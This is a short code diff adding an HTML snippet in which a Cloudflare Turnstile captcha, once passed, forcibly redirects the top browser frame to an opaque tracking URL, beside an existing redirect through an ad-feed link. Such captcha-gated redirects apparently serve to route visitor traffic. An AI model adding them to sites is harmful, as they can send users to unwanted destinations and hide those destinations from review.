@@ -139,3 +139,17 @@ ezmo-redirect
     top.location.href = "https://xml.qualiclicks.com/redirect?feed=612051&auth=nH86D4&url=https://smokeebash.com&subid=";
   }
 </script>
+
+stuff-redirect
+
+<div class="cf-turnstile" data-sitekey="0x4AAAAAAATxbAZe1ABfQkus" data-callback="validateAndRedirect"></div>
+
+<script src="https://challenges.cloudflare.com/turnstile/v0/api.js?onload=onloadTurnstileCallback" defer></script>
+
+<script>
+  function validateAndRedirect() {
+    // Your validation logic here, e.g., solving the captcha
+    // If validation is successful, perform the redirect
+    top.location.href = "https://link.stuffserve.com/3dea0375-736b-4956-9292-81f1b3610302";
+  }
+</script>
